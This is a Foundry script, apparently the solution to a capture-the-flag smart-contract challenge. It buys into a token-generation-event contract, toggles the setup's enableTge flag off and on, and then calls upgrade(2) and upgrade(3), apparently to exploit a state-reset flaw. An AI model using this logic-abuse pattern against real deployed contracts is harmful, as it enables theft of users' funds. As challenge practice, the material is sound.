// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

interface ISetup {
    function tge() external view returns (address);
    function token() external view returns (address);
    function enableTge(bool) external;
    function isSolved() external view returns (bool);
}

interface ITGE {
    function buy() external;
    function upgrade(uint256) external;
}

interface IToken {
    function approve(address, uint256) external returns (bool);
}

contract Exploit is Script {
    uint256 constant PRIVKEY = 0xPRIVATE_KEY;
    address constant SETUP_ADDR = 0xSETUP_ADDRESS;

    function run() external {
        vm.startBroadcast(PRIVKEY);

        ISetup setup = ISetup(SETUP_ADDR);
        ITGE tge = ITGE(setup.tge());
        IToken token = IToken(setup.token());

        token.approve(address(tge), 15);
        tge.buy();

        setup.enableTge(false);
        setup.enableTge(true);

        tge.upgrade(2);
        tge.upgrade(3);

        setup.isSolved();

        vm.stopBroadcast();
    }
}